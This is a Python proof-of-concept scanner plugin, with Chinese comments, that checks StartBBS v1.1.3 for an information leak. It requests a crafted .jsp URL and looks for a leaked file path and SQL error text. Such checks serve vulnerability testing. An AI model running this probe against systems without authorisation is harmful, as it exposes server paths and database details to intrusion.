# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0102'  # 平台漏洞编号，留空
    name = 'StartBBS v1.1.3 物理路径泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
    http://startbbs/index.php/home/getmore/w.jsp 随意构造一个.jsp爆出数据库查询语句。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://www.wooyun.org/bugs/wooyun-2013-045780
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9ad4b208-7a1f-435d-b125-624ba0ea6243'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/index.php/home/getmore/w.jsp'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if 'Filename:' in content and 'You have an error in your SQL syntax' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()